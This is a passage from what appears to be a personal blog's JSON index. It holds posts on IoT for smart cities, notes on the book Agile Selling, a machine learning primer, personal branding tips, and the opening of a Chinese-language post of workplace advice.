deploy an infrastructure that provides simple and economical access to most if not all public services, including transportation and parking, lighting, utilities, surveillance and maintenance of public areas, and more. What does this theoretical smart city concept mean in practice? We're talking about all sorts of potential public benefits, including more efficient traffic flow, better management of public buildings and areas, reducing the (huge) costs of public lighting, better management waste removal and other public utilities, and more effective policing and emergency services.\nAs with all IoT related activities, the smart city will be powered by data collected from smart devices of all shapes and sizes. All this data can also be used to increase the transparency of the local government, enhance the awareness of the public about the status of their city, and stimulate citizen's participation in the public administration.\nThere are the obvious technical and financial challenges, of course (it's all rather complex and expensive to implement), but cities face additional political issues.\nWith literally hundreds of billions of dollars in spending at stake, who makes the purchasing decisions? And who benefits from local and state contracts? Who makes the decision, especially when technology must necessarily bridge multiple adjacent municipalities? And how do governments deal with the privacy and security issues inherent with the massive level of data collection and de facto public surveillance. Once these challenges can be overcome (and they inevitably will be), expect your city to install thousands of sensors on local streets, parks, and buildings, the better to gather information about public usage, air quality, noise levels, and the like and then use the collected data to provide better and more efficient services. The future is bright for cities and citizens everywhere.\nSmart infrastructure A smart city starts with enhanced smart infrastructure.\nThe IoT is built on the collection of various types of data, and the typical city offers a plethora of data just waiting to be collected. That means building out an infrastructure that includes the neccessary sensor devices, of various types, and a communication networks to link them all together. For instance, to properly monitor the continuing safety of a bridge requires a variety of sensor types, including temperature, humidity, vibration, and pressure sensors. In earthquake-prone regions, add seismic activity sensors and accelerometers to the list.\nAll these sensors have to be connected to a central system that monitors data in real time and analyzes the historical data for trends. All the data is relevant, and all must be collated and analyzed.\nThe challenge is deploying all the necessary sensors and then networking them together in an efficient manner. A city, then, must construct some sort of low-power wireless sensor network (WSN) to connect these and other sensors in the public purview.\nAnother example. Instead of waiting for a citizen to complain about a pothole (typcially because he lost a hubcap while driving into the thing), smart sensors detect the presence of the hole and report it - complete with its location and size - to the central system. The system automatically enters the issue into its main database and assign repair to an appropriate street crew, prioritized based on location and severity.\nPolice and other emergency responders also benefit from faster, smarter communications. Security systems are connected directly into the city's central system so that police are notified the instant an alarm goes off.\nSame things with firefighters. A smoke alarm goes off, the data get sent directly to the nearest fire department. Before they pull fire truck out of the station, they know where in the building the fire is active, the best route into and through the building, and what obstacles they might face. They also get the latest floor plans of the burning building, previously stored in their central database.\nEmergency medical technicians (EMT) also get smarter and more effective thanks to the IoT. When a call comes in, they receive data from any wearable medical devices on the citizen, as well as the person's complete medical history. The responders know what to expect before they ever get there and can thus be better prepared for that particular medical emergency.\nWhether it's a flood, tornado, snowstorm, or hurricane - or mass shooting, explosion, or terrorist attack - authorities will be better informed beforehand and experience more efficient communications in responding to the event.\nSmart Roads and Traffic management Cities, whether urban or suburban, have to deal with a lot of motorized vehicles. We're talking traffic control, road maintenance, parking management. It's a major headache.\nSmart parking If you live in a city of any decent size, you know how hard it is to find a parking place, especially during popular events. Wouldn't it be great if you knew exactly where the nearest open space was, so you wouldn't spend half your time driving around looking for it?\nSmart parking technology is out to solve this particular problem.\nSmart Traffic management Traffic itself can be a nightmare, with massive congestion commonplace in many metro areas.\nWhen you want to avoid traffic jams and minimize the number of red lights you have to stop at, it's time to turn to the IoT. By constantly monitoring traffic flow with its roadside sensors, the IoT's smart systems can manipulate traffic signals and even lane availability to make sure the greatest number of drivers get to their destinations with the least number of interruptions.\nWhat we'll get with the IoT is more sensors monitoring more cirtical points, providing a denser grid of data. Sensors can be embedded in roadways or installed street-side in traffic signals or light poles; different types of sensors will monitor different things, such as vehicle traffic, air quality, noise levels, and the like.\nData can also be co-opted from drivers' smarthpones or smart cars. Manage traffic signals and other activities to keep cars moving as rapidly as legally possible and lots of good things result - drivers get where they're going faster, there are fewer accidents, road deterioration is minimized, and the air quality improves.\nIt's all about Smart Transportation Systems (STS)\nSmart Roads Low-hanging fruit: it's easier to install a few sensors in a local roadway than it is to convert entire fleet of automobiles into self-driving vehicles. It's a combination of several different technologies all designed to better manage traffic flow and avoid congestion and accidents\nGlow-in-the-dark road markings: stripes and other markings made from paint that 'charge up' during daylight hours. The markings then glow green for up-to ten hours during the night Smart road lights: Lighted roadways are safer than dark stretches of highway, but it costs money to power all those lights. Smart roadway lighting use motion-sensing technology to tell when a car is approaching and then lights that section of highway. The lights grow brighter when a car comes closer and slowly dim as it passes. It's great technology for less-travelled roadways where lighting is valuable but not currently economically feasible. Wind-powered lighting: Wind-powered lights use roadside pinwheels to generate electricity, using wind drafts from passing cars. The pinwhells only revolve when cars speed by, thus lighting up the road ahead for them. In a way, it's self-powered lighting for and by the motorists themselves. Priority lane for electric vehicles: speaking of electricity, how about using the highway system to charge up our coming fleet of electric cars? Some experts are proposing the creation of induction priority lanes with embedded magnectic fields, designed to charge electric vehicles while they're on the go. Solar roadways Smart roadway displays: Instead of relying on the traditional overhead or side-of-road signs, we can use the solar panels embedded in our roadways to display information to drivers via light-emitting diodes (LED). In addtion to powering conventional road markings, imagine a roadway with lighted arrows alerting you to upcomming lane changes, numbers that display your speed or the posted speed limit, or words and letters that deliver important messages. It's very futuristic but potentially game-changing. Smart public lighting Public lighting is a big expense for most cities - approaching 20 percent of all electricity consumed. If that power consumption can be reduced by even a small amount, the savings can be considerable.\nSmart Utilities Many cities run at least some of their own utilities - water, waste management, even gas and electricity. Keeping costs down for both the city and its residents is an important challenge\nSmart Waste management In the IoT future, image a container with embedded sensors that detect how full the bin is and summons the truck only when necessary. This will reduce costs by optimizing the truck's route and make for more efficient collection.\nSmart water management Municipal water management is also a major source for IoT optimization. Right now, most cities still employ meter readers to walk through neighborhoods and take manual meter readings.\nGoing forward, cities will install smart water meters with embedded sensors and radio-frequency (RF) transmitters to monitor individual household water consumption. By collecting real-time data, the water utility can notify customers (via phone, email, or text) if usage levels are unusual, thus warning of potential water leaks.\nThe data will also provide cities with insight into overall usage trends on a neighborhood-by-neighborhood basis.\nSmart grid Another public utility that deserves even more attention is the electric compnay and the overall electric grid. Power usage can get a lot more effcient when we connect various smart devices to a new smart grid.\nIt's a modernized electrical grid - the collection of power plants, transformers, and transmission lines that bring electricity to all the homes and businesses in a given area. Moving forward, we need a smarter grid, one built from the ground up to handle larger power loads - and better manage those loads.\nThis new grid, the so-called smart grid, will use digital communications technology to collect and disseminate data about energy usage - the behaviors of both consumers and suppliers. That data can then be used to improve energy efficiency, helping consumers use less energy and save money. The smart grid will enable two-way communication between the utility and its customers, which will let smart home devices talk to the utility and make for more efficient energy usage. This new grid will also contain sensors along trasmission lines to better monitor power usage in all possible ways and respond more quickly to changing energy demand.\nSmarter energy management The last point means putting power where and when it's needed. More effcient distribution of the power load will result in fewer power outage and brownouts and, as power usage will be better-balanced, require less power overall.\nPower usage can also be managed by having the utility communicate with smart devices installed in homes and businesses. We're talking smart thermostats, smart appliances, and the like that can receive instructions from the power company and shift their usage to times with lower demand.\nFor example, during a hot summer day when energy usage is peaking, the utility might send out instructions to cut power for nonessential operations, such as turning up the temperature for air conditioners and turning off appliances such as dishwashers and laundry equipment. This will not only help alleviate overall demand for electricity, but also lower usage rates.\nA self-healing grid Today, a small power outage quickly becomes a larger one, thanks to the domino effect of failures cascading along the line. Comapneis often don't know where problems lie until customers call in the complain. And it often takes an inordinate amount of time to repair the damage and bring blackened areas back online.\nA smart grid will better manage blackouts and damages, due to what the industry calls distributed intelligence. This involves capturing data at the 'edge' of the grid, where the electricity is consumed, by smart power meters and sensors in homes and businesses. By analyzing this data on the spot in real timem more information and faster decisions can be made, especially in emergency situations.\nDistributed intelligence will enable utilities to know about outages at the moment they occur, well before custoemrs call in. The power company will be able to quickly pinpoint the source of an outage so that repair crews can immediately be dispatched to the problem area. The smart grid will also enable utilities to better isolate power outages before they affect the rest of the grid, rerouting power paths around the problem area to keep the power flowing to the majority of customers. This will harden the entire system against all manner of emergencies, from severe storms to sunspot activity to terrorist attacks. In addition to minimizing the extend of an outage, the smart grid will also be more easily repairable. Service will be able to come back online more quickly after an emergency, with selective enabling - routing power to emergency services first. In this mannger, the smart grid becomes a self-healing distribution system.\nCollecting and using the data The power comapnies, of course, will take full advantage of all the data collected to more effectively manage their resources and infrastructure. Companies will get a better handle on customer energy usage and manage supply to better match this demand. All the data generated by the smart grid will (or at least should) be available to customers, too. The more you know about your own energy usage, the smarter you can be about what you use and how. You'll have access to real-time data about energy usage by time of day, and what devices exactly are using all the electricity. You'll also see how much that usage costs, which will help you save money by using less power when electricity is most expensive.\nBuilding the smart grid Creating a smart power grid is going to be a lot of work and cost a lot of money. The new smart grid will consist of millions of individuals pieces and parts - power lines, sensors, controls, computer systems, and the like. Not all neccessary technologies are widely available today; some are still in development and need extensive testing before being publicly deployed. It will take time for it all to come together.\nConsider the following technologies thought to be part and parcel of the smart grid:\nIntegrated two-way communications, either via traditional wired networks, power-line networks, or wireless networks. These communications are necessary for real-time control, data collection and exchange and security. Sensing and measurement, to monitor electricity flow and equipment status, evaluate congestion and grid stability and prevent energy theft. All manner of sensors may be deployed, including those to measure voltage and wattage, ambient temperature and humidity, weather conditions, electromagnetic signature, energy leakage, and the like. Phasor measurement units (PMUs), high-speed sensors distributed throughout the entire transmission network to monitor the state of the system. These sensors take up to 30 measurements per second, representing the magnitude and phase of the alternating voltage at a given point in the network. PMUs enable automated system to quickly respond to evolving system conditions in a dynamic fashion, thus minimizing downtime and preventing further outages. Distributed power flow control, via devices that clamp onto transmission lines to control the flow of electricity. This technology provides more consistent, real-time control over how energy is routed within the grid, and to store customer-generated electricity. Smart meters: installed a customers' homes or businesses. Theses are digital meters (as opposed to the old mechanical ones) that monitor usage in real time and provide aumated transfer of information between the power company and customers' smart devices. Smart meters will also provide utilities with more data about how electricity is being used in individual localtion and throughout their service areas. Smart power generation, to match electricity production with demand by using generators that can start and stop idenpendently of other units. This is called load balancing and can be automated via the sensors, controls and systems of the smart grid. Intelligent control systems, capable of constant monitoring, instant diagnosis, and appropriate solutions to grid disruptions or outages. These systems will incorporate distributed intelligent agents, analytical tools and algorithms, and operational applications. To a large extend, the smart grid is being piecemealed together from these and other technologies. Some experts estimate that it will take at least a decade for all the pieces to come together - but when they do, we'll all see immediate and significant impact.\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2019/iot_for_smartcities/","section":"post","tags":["iot","booknotes","smartcity"],"title":"Iot for Smart Cities"},{"body":"","link":"http://localhost:1313/tags/smartcity/","section":"tags","tags":null,"title":"Smartcity"},{"body":"Agile Selling Published: Jan 27, 2019 Tags: booknotes, sales Category: Business\nThere is new challenge to sell since buyers have changed. When they have an issue, they go online to research their problem. Buyers self-educate, leaving the seller totally out of the loop. Without deep buyer understanding, it's increasingly difficult to get business. You're dealing with educated people who want conversations and collaboration, not pitches of any sort.\nTable of Contents Reframing Failures Turn the sales problem into a challenge rather than a personal problem.\nNeuroscience research shows that when you make a mental shift to view obstacles as opportunities, your brain is reenergized.\nWhen a competitor wins a deal, agile sellers refuse to see themselves as the losers.\nFailure isn't one bit personal. Failure is a nature part of the learning process.\nIf you're struggling, you're not failing. You just haven't learned it yet.\nSetup the right goals While it's admirable to strive for the stars, research shows that big goals can actually be a hindrance, especially before you've achieved a level of proficiency.\nRapid learning Breaking new info down into discrete chunks Searching for the 'minimum effective dose' The goal is to find the least amount of work needed to produce outstanding results fast You know what buyers pick as the differentiator in their decisions? The sales experience itself. To become the differentiator, you need to always be learning. We need to provide value in every conversation and manage the customer experience. Learning agility is your only sustainable competitive advantage.\nUnderstand Buyers Understanding who you're selling to is far more important than what you're selling!\nPeople, not organization, make decisions. Selling is and always will be about dealing with people. That's why it's so crucial to be conscious of our impact on them. Everything we do either draws them toward us or moves them further away.\nThe more you know about what makes your buyers tick, the better off you'll be. Start by finding out who is involved in making decisions.\nOnce you nail down the positions, you need to understand their roles and responsibilities, objectives, motivations, status quo, and challenges.\nThis essential info helps you:\nCraft relevant, enticing messages Plan customer-engaging meetings Help people make the right decisions Differentiate yourself from competitors Buyer's matrix\nPosition Roles/responsibilities: what are they in charge of or expected to manage? Business objectives and metrics: what do they want to achieve? How do they measure success? How are they evaluated? Strategic initiatives: what likely strategies and initiatives are in place to help them achieve their objectives? Internal challenges: what likely issues does the organization face that could prevent/hinder goal achievement? External challenges: what external factors or industry trends might make it more difficult to reach their objectives? Primary interfaces: who do they frequently interact with (e.g. peers, subordinates, superiors, and external resources)? Status quo: what's their status quo relative to your product or service? Change drivers: what would cause them to change from what they're currently doing? Change inhibitors: what would cause them to stay with the status quo, even if they're unhappy? Embrace the status quo The truth is, the status quo is your biggest competitor. Your prospects don't want to change how they're doing things.\nAsk questions:\nHow do our targeted prospects do things without us? What problems might they be encountering with their current way of doing thing? How do these problems impact efficiencies? Costs? Revenue? Other departments? What effect does this status quo have on achieving their objectives? What's the business case of making a change? What issues might arise if they're doing it themselves? Immerse yourself in the status quo. Search for its weakness, shortcomings, and gaps. Once you have a working knowledge of your biggest competitor - the status quo - you'll be able to have more intelligent conversations with your prospects.\nBusiness case Many companies fail to arm their sellers with a strong business case. They still believe that their products or services sell themselves.\nDon't tell wrong story. Focus area should not be own company's story, and miss client's story.\nInterview your customers One of the best things you can do to learn why people buy your products or services is to interview your own customers. Don't be shy about this. You/ll be amazed at what you can learn and just how valuable it can be in your sales initiatives.\nBe aware that you may occasionally run into an unhappy customer. If so, listen carefully to their issues and don't be defensive. Find out what you can do to help.\nBelieve it or not, people tell you a whole lot more over the phone than if you're face-to-face. And don't waste your time trying to do it via e-mail or online surveys; the response rate is low and the quality of info is poor.\nMake sure you plan your questions ahead of time. Otherwise, the conversation can wander all over the place and the answers you get won't be helpful. Consider recording your interview too, so that you can listen to it again for insights you might have missed the first time.\nDefine the buyer's journey +---------------------------+---------------------------+---------------------------+---------------------------+ | 1st decision:\t| 2nd decision | 3rd decision:\t| 4th decision | +---------------------------+---------------------------+---------------------------+---------------------------+ | Allow Access\t| Initiate change\t| Select resources | Expand relationship | +---------------------------+---------------------------+---------------------------+---------------------------+ | Buyers are reasonably | Buyers are interested in | Buyers educate themselves | Buyers evaluate | | happy with the status quo | learning more. They | on options, get proposals,| satisfaction with the | | until something either | research, they meet, they | validate ROI. Their key | initial decision and | | piques their curiosity or | discuss. The key question | question is: What's the | relationship. Their key | | changes their priorities | they ask is: Does it make | best decision for us? | question is: Should we do | | | sense to change from the | | more work with them? | | | status quo? | | | +---------------------------+---------------------------+---------------------------+---------------------------+\nGain insights Whenever you're talking to prospects, try asking the following questions to gain even greater insight into their buying journey:\nWhat piques your curiosity and gets you to even consider a change? Who are the people who need to be involved in decisions like this? How do you determine if a product or service makes good business sense for your company? How do you decide which resource is best for you? What are the most challenging parts of this decision process? Why? What does it take to get a contract for something like this approved? Become an expert on your buyer's journey. Knowing where you stand in the journey will help you decide which strategies to use and when.\nSome trigger events are internal to an organization, such as new executives, bad third-quarter earnings, re-orgnizations, mergers, product launches, or expansions. Others are external happenings such as legislative changes, new competitors, economic conditions, increased costs of borrowing money, or new technologies.\nLearn the lingo\nCompany Industry Financial Other Sales Toolkit The key to long-term success is short-term success. No matter how long you've been in sales, there's always room for improvement.\nAsk yourself these questions to determine the best sales skills to focus on initially:\nAre you satisfied with your prospecting results? If not, you need to figure out what's causing your problems and how you can change Are enough of your initial conversations turning into serious discussions? If there's big drop-off, consider what you can do to get better results Do you lose to 'no decision' frequently? If too many forecasted prospects decide to stay with their status quo, focus on opportunity creation skills Are competitors beating you up? If so, look at improving those sales skills that help you win the business Are your existing customers growing? If so, it's time to get to the root cause of why you're not expanding the services you offer to those customers and brainstorm ways you can change that Measure performance\nConnection ratio Initial meeting conversion Length of sales cycle Closing ratio Losses to no decision Here's what you need to be asking about\nStatus quo relevant to your offerings Issues and aspirations you can impact Business value of making a change Possible solution, ideas they've considered Perceptions of priorities, risk, vendors Where they are in their buying journey Address negatives If you notice negative behaviors, you can stop and recalibrate your direction. Perhaps you could even say something like, 'you seem distracted', or 'it looks like you've got some hesitation about changing things here'. These honest statements and beneficial for both you and your prospect.\nRecovery strategy: 'Sorry, Mr prospect. Sometimes I just get so excited about how we might be able to help. But I really don't know enough about your business yet. Let's get back to talking about those challenges you mentioned earlier.\nOne of the biggest fails of all - interested people who stay with the status quo. If this is happening to you, it's crucial to ask yourself:\nWhy don't they see the value of change? How can I build a stronger business case? What questions could I ask to help them realize the cost of sticking with the status quo? Am I rushing to a solution too quickly? People won't buy unless they believe that changing is worthwhile. That's the real issue. No matter how much training your sales team gets on closing, it won't address the root cause of their problem.\nOptimize time usage Make various checklists to help you remember things\nTo ensure that you get the right work done in the shortest possible time - and as soon as possible - try the following strategies for power-packing your day:\nPrioritize daily Chunk your time Set deadlines Avoid multi-tasks to upgrade your brain\nCheck email on a schedule - 3 - 4 times per day Protect yourself from yourself: stay focus Totally disconnect Top sellers spend more time prepping for meetings than average sellers, at every point in their careers. They still role-play. They debrief regularly. They exchange ideas with their colleagues.\nWhile your time is a finite resource, your energy level is a renewable one.\nTake time out to think and reflect, by yourself.\nFast Growth Make your own personal growth and development the number-one priority.\nIt seems strange to recommend teaching others while you're still learning yourself. After all, we so quickly defer to the experts. However, the upside can be huge. As the Roman philosopher Seneca wrote nearly two thousand years ago, 'by teaching, we learn'\nGaming the system\nThe objection game: whenever I encounter an objection that stumps me, I turn it into a game The competitive game: whenever I'm up against a known competitor, I approach it like a chess game. The one-customer game: I take a look at my best customer and ask, \u0026quot;if this were the only company I could work with, what would I need to do to earn a decent living here?\u0026quot; Here are some ways you can build more grit:\nFocus on what's controllable Challenge yourself Take a break Fake it till you make it\nPrior to making an important call, stand up and assume a power pose If you're waiting to go into a big meeting, stop by the restroom before it starts and assume a power pose in privacy When you're sitting in a lobby, take over the chair. Spread out while you wait While giving a presentation, stand tall and use bigger gestures. Think of someone you can emulate. Repeat a personal mantra that makes you feel more powerful Never go behind someone's back\nIf you need to meet with people other than the person you're currently working with, make sure you find a valid reason for it and. If possible, engage your current contact in setting it up. Hope is rampant in sales. We need it to keep going - but we also need to avoid being fooled by false hope. The longer a deal stays in your pipeline, the less likely you are to ever close it, even if your prospect claimed that he or she desperately needed your offering. If the sales process does get stalled out, the only person who loses is you. Purge your pipeline.\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2019/agile_selling/","section":"post","tags":["booknotes","sales"],"title":"Agile Selling"},{"body":"","link":"http://localhost:1313/categories/business/","section":"categories","tags":null,"title":"Business"},{"body":"","link":"http://localhost:1313/tags/sales/","section":"tags","tags":null,"title":"Sales"},{"body":"","link":"http://localhost:1313/tags/ai/","section":"tags","tags":null,"title":"Ai"},{"body":"Machine Learning Basic Published: Jan 13, 2019 Tags: ai Category: ComputerScience\nThis blog introduces the basic knowledge of machine learning. The details of algorithm and programming will come in later blogs. Machine learning is a technology which can resolve the computational problem without programming specifically.\nTable of Contents Process Machine learning project has its own process, which starts with asking the right questions.\nAsk yourself: Do you have the right data to answer the question? Ask yourself: Do you know how you'll measure success? The process also includes re-create model regularly, see following picture.\nPeople are highly involved in the iteration of machine learning, e.g. adjusting algorithm, training data, selected features, parameters to algorithm.\nCRISP-cycle Cross-industry standard process for data mining, also known as CRISP-DM. It is also very relevant to machine learning projects.\nBusiness understanding Data understanding Data preparation Modeling Evaluation Deployment Learning Algorithm Overview The data contains the pattern, the algorithm find the patterns, and the trained model can recognizes the patterns.\nSupervised Learning The value you want to predict is in the training data. The data is labeled.\nSupervised Learning includes the following algorithms:\nK-Nearest neighbors Linear regression Logistic regression (sigmoid function, one-versus-all (OvA) strategy or one-versus-the-rest, one-versus-one (OvO) strategy) Support vector machines (SVMs) Decision trees and random forests Neural network Unsupervised Learning The value you want to predict is not in the training data. The data is unlabeled.\nUnsupervised Learning includes the following algorithms:\nClustering Example question: What are our customer segments?\nk-means Hierarchical cluster analysis (HCA) Expectation maximization Visualization and dimensionality reduction Principal component analysis (PCA) Kernel PCA Locally-Linear embedding (LLE) t-distributed stochastic neighbor embedding (t-SNE) In machine learning, kernel methods are a class of algorithms for pattern analysis, whose best known member is the support vector machine (SVM). The general task of pattern analysis is to find and study general types of relations (for example clusters, rankings, principal components, correlations, classifications) in datasets. In its simplest form, the kernel trick means transforming data into another dimension that has a clear dividing margin between classes of data. For many algorithms that solve these tasks, the data in raw representation have to be explicitly transformed into feature vector representations via a user-specified feature map: in contrast, kernel methods require only a user-specified kernel, i.e., a similarity function over pairs of data points in raw representation.\nTo simplify the data without losing too much information, one way to do this is to merge several correlated features into one =\u0026gt; feature extraction\nLinear Discriminant Analysis: characterizes or separates two or more classes of objects or events. The resulting combination may be used as a linear classifier, or more commonly, for dimensionality reduction before later classification.\nAssociation rule learning Association rule learning is a rule-based machine learning method for discovering interesting relations between variables in large databases. It is intended to identify strong rules discovered in databases using some measures of interestingness. This rule-based approach also generates new rules as it analyzes more data. The ultimate goal, assuming a large enough dataset, is to help a machine mimic the human brain’s feature extraction and abstract association capabilities from new uncategorized data.\nApriori: It proceeds by identifying the frequent individual items in the database and extending them to larger and larger item sets as long as those item sets appear sufficiently often in the database. Eclat Unsupervised learning is also used on Anomaly detection use cases, e.g. distributed Gaussian.\nSemi-supervised learning Semi-supervised learning is a class of machine learning tasks and techniques that also make use of unlabeled data for training – typically a small amount of labeled data with a large amount of unlabeled data.\nDeep belief networks (DBN)： Based on unsupervised components called restricted Boltzmann machines(RBMs). Deep belief network (DBN) is a generative graphical model, or alternatively a class of deep neural network, composed of multiple layers of latent variables (\u0026quot;hidden units\u0026quot;), with connections between the layers but not between units within each layer.\nReinforcement learning Reinforcement learning (RL) is an area of machine learning concerned with how software agents ought to take actions in an environment so as to maximize some notion of cumulative reward.\nAgent can observe the environment, select and perform actions and get rewards in return. It must then learn by itself what is the best strategy, called a policy to get the most reward over time.\nOther algorithms Batch learning The system is incapable of learning incrementally: it must be trained using all the available data. It can also be called offline learning. Retrain the model if necessary.\nOnline learning The system is trained incrementally by feeding it data instances sequentially, either individually or by small groups called mini-batches or out-of-core learning, incremental learning.\nLearning rate: how fast they should adapt to changing data.\nInstance based vs Model based learning Instance based learning: the system learns the examples by heart, then generalizes to new cases using a similarity measure. Instance based learning is a family of learning algorithms that, instead of performing explicit generalization, compares new problem instances with instances seen in training, which have been stored in memory.\nModel based: to build a model first.\nAccuracy and Precision There is no surprise for Machine Learning projects, one of the goal is to achieve high enough accuracy.\nThe following picture explains the difference between Accuracy and Precision well.\nHigh variance: is normally overfitting problem High bias: is normally underfitting problem Utility function or fitness function Untility function measures how good your model is or you can define a cost function that measures how bad it is. Cost function applies on training set, gradient descent, used in regression. Alternative option of gradient descent is Stochastic Gradient Descent (SGD) classifier.\nRegularization Overfit: resolved by regulation, by reducing number of theta (degree of polynomial).\nThe amount of regularization to apply during learning can be controlled by a hyperparameter. A hyperparameter is a parameter of a learning algorithm (not of the model).\nMeasurement Root mean square error (RMSE): measures the standard deviation\nMean Absolute Error (MAE)\nThe higher the norm index, the more it focuses on large values and neglects small ones. This is why the RMSE is more sensitive to outlier than the MAE.\nPrecision = TP/TP+FP\nRecall = TP/TP+FN\nIf someone says 'let's reach 99% precision', you should ask, 'at what recall'.\nF1 score is useful for skewed class. F1 = 2PR/(P+R)\nROC (receiver operating characteristic) curve is a measure of binary classifier. The ROC curve is created by plotting the true positive rate (TPR) against the false positive rate (FPR) at various threshold settings. Measure ROC AUC (area under the curve)\nBreak-Even point P = R\nK-folds cross-validation 3 dataset: train set, cross-validation set, test dataset.\nAccuracy is generally not the preferred performance measure for classifiers, especially when you are dealing with skewed datasets.\nA much better way to evaluate the performance of a classifier is to look at the confusion matrix.\nCost matrix: Cost matrix is similar to the confusion matrix except the fact that we are calculating the cost of wrong prediction or right prediction. In different context, the cost of error will be different.\nTraining and test dataset need to ensure data distribution is consistent, to avoid the data distributed not evenly and impact the final results. stratified sampling\nData Amount The amount of data is also important for accuracy.\nDrawbacks https://www.quora.com/What-are-the-dangers-of-using-machine-learning-libraries-without-any-understanding\nHere’s a picture of a cat right? Google’s Inception model thinks it’s a guacamole. As much as the image looks like a cat, the image is digitally altered which confused the model.\nSlightly rotating the image led the model to correctly classify the image as a cat (and as an animal)\nThe above image is what’s called as an adversarial image, trying to fool your model into thinking the image is something you want it to be instead of what the image actually is.\nWe have many technologies that allow us to use AI/ML (and not just deep learning) as a blackbox. The real danger is in the application, especially in healthcare and defense. For example, how would you convince that your model for predicting cancer actually works? How do you know your model is not susceptible to noise? How do you know that your model has actually learnt what it is supposed to be learning? How do you actually read interpretability here? If you can’t interpret what the model has learnt, then you can’t sell it.\nAnother case can be found here:\nhttps://www.theverge.com/2017/11/2/16597276/google-ai-image-attacks-adversarial-turtle-rifle-3d-printed\nBut the questions to be asked are:\nHow would you now ensure that the results be consistent in application, without posing any vulnerabilities or risk? Did you really need a AI/ML solution? If you can't explain it simply, you don't understand it well enough.\nAlbert Einstein Others The good news is there is no need for you to build everything from scrach. You can use cloud machine learning services out-of-box.\nCloud machine learning services Azure Cognitive Services: Pattern recognition-as-a-Service\nDeep learning Will explain the details of deep learning in later blogs.\nWith the increasing data especially reach some amount, the deep learning algorithm will have better performance than machine learning.\nNormally, machine learning needs human being to be involved to extract features rely on human experience. However deep learning consists of several layers. They combine simpler models together and pass data from one layer to another to build up a complicated model.\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2019/machine_learning_basic/","section":"post","tags":["ai"],"title":"Machine Learning Basic"},{"body":"","link":"http://localhost:1313/series/2018/","section":"series","tags":null,"title":"2018"},{"body":"Personal Branding Published: Dec 25, 2018 Tags: career Category: Management\nTo be a great technical expert, you do not only do exceptional technical work, and also exceptional job to let people see your skills.\nBuild your personal brand Your personal brand is how others perceive you. It means you can ask others, capture their language, use their language in your branding.\nFirst, let's write down what is your personal brand is.\nThen, you can do the followings:\nDo these things Answer questions Document your learning Share your failures Build something new Talk about your development process Justify your technical decisions Share updates on what you're building The channels you can utilize are, blog, conferences, usergroup, stackoverflow, github, hacker news, Reddit programming, etc.\nMethods There are various methods to build personal branches, some of them are easy while the others are hard.\n+-------------+----------+-----------+-------------+ | | Easy | Hard | Hardest | +-------------+----------+-----------+-------------+ | Conference | Attend | Speak | Create | +-------------+----------+-----------+-------------+ | Forum | Lurk | Post | Build | +-------------+----------+-----------+-------------+ | Blog | Read | Write | Tribe | +-------------+----------+-----------+-------------+ | Framework | Learn | Master | Create | +-------------+----------+-----------+-------------+\nThe personal brand needs to be built step by step.\nDefine brand boundaries Tagline 30 Second Pitch Business Cards About.me LinkedIn Profile (Summary, etc.) On-brand picture/avatar Testimonials: Find influencial people and say something about you or recommond you Blog Ebook, Pluralsight course Toast master Regarding to business card, there are creative examples in the following link:\nhttps://mashable.com/2013/05/16/crazy-business-cards\nThe business card can also be interactive:\nhttp://www.rleonardi.com/interactive-resume/\nPush it further Start acting like a thought leader. Fake it before you make it. Pay for your own travel to speak across the country Post consistently to your blog as though readers already exist Write a book - even if you have no publisher Act like you're rich Pay others to free up your time Start working only part-time so you have more time to learn Speak in public Startup weekend/code for charity Connect people: create a meetup/user group/mastermind Do open source project Be social: never eat alone Help your evangelists Measure your brand You shall measure the brand to see where you are.\nGoogle Alerts/Talkwalker/Social Mention TweetBeep Online ID Calculator Bit.ly for shared links CEO of Me, Inc It will be interesting to treat yourself as a comapay: Me, Inc. And you are also the CEO.\nKey questions you need to address:\nHow do people perceive me? How do people find you? You have a market team (you): who do I market to? If you want to market to the whole world, then the effort will be huge, how can I achieve that? Think differently People with less programming/technical skills but much better communications skills will often be more successful than you.\nStop, think, speak!\nSearch for Scale:\nL1: Work: fix bugs, bill by the hour, do as you're told L2: Lead (Talk about work): Select architectures \u0026amp; technologies, mentor, hire \u0026amp; lead teams, define project scope \u0026amp; process L3: Own: Product: SAAS, PAAS, framework, author Luck Surface Area Your Luck Surface Area is directly proportional to the degree to which you do something you're passionate about combined with the total number of people to whom this is effectively communicated.\nby Jason Roberts (see details from Bit.ly/1heY4uo)\nNetworking \u0026amp; Communication You network and relationship means your brand, employability, revenue stream.\nThe best networkers are listeners rather than talkers, have a clear agenda, and are not shy about asking for feedback and guidance.\nRemember that networking is more about giving than it is about talking.\nMartin Buckland Give more than take, but ready to receive\nPower Connector Should you be a Power Connector?\nYou provide value to your contacts You strengthen your relationship with others Your brand solidifies and includes: 'seems to know everyone!' You focus more on giving Quality of communication For communication: Quality is over Quantity\nImpact of words - 7% Impact of voice - 38% Impact of body language - 58% Be careful of the inconsistent message.\nListen with all your senses. The truth about multitasking - just a fantasy!\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2018/personal_branding/","section":"post","tags":["career"],"title":"Personal Branding"},{"body":"职场菜根谭 Published: Dec 09, 2018 Tags: career Category: Management\n之前在网络上搜集到了多种关于职场建议的养分，也结合个人的经验教训，提取出些所谓的精华，大言不惭，称之为职场菜根谭。\nTable of Contents 职场潜规则 入职工资很重要: 这就是企业对于你的价值的一种认可程度，当然对自己的价值也需要有个清晰的认识，做决定时候应综合考虑 人事部不是你的倾谈对象 你的能力并不能确保你的安全: 熟悉企业‘政治’，摸清游戏规则 不要和老板作对: 赢率太小 学会要求加薪：证明价值，不能威胁上司，立场应该为“我很喜欢这个公司还有目前的业务，但是我觉得目前的工资跟我实际做的工作有差距，我希望工资能体现我的价值” 晋升方面不要多出意见：主要做出成绩，让上司看到热情和能力 积极配合新上司 创业 要想创业，首先要对创业有火一样的激情。 良好的用户体验至关重要，很多产品失败的原因就是产品本身过于复杂，用户难以从中获得很好的使用体验。 要掌握一定的技术，你可以不用编写代码，但必须了解产品的生产过程和运作流程。 创业公司的CEO必须是公司的产品经理。 了解公司的轻重缓急，重点发展核心项目。 对产品的用户体验进行跟踪调查，产品和用户体验的提升是个永无止境的过程。 注重产品的出货，只有用户使用了产品并给了回馈后你才能了解产品究竟怎么样。 公司要把提高产品质量放在第一位。 